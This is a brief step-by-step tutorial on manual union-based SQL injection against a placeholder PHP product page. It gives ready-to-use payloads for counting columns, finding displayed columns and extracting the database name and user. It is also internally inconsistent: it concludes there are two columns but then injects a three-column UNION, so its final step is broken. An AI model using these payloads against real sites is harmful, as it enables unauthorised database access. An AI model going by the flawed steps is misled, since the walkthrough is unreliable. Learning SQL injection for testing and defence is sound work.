Manual Union-Based SQLi Walkthrough
Step-by-Step Exploitation

Scenario: Vulnerable URL: http://example.com/products.php?id=1

Step 1: Determine Column Count

Append ORDER BY N-- - to find the maximum number of columns. If ORDER BY 3-- - causes an error, there are 2 columns.

?id=1 ORDER BY 2-- -

Step 2: Find Displayable Columns

Use UNION SELECT NULL, NULL-- -. Replace NULLs with numbers (e.g., 1, 2) to see which positions render output.

?id=-1 UNION SELECT NULL, NULL-- -

Step 3: Extract Database Information

Inject SQL functions into displayable columns.

?id=-1 UNION SELECT NULL, database(), user()-- -
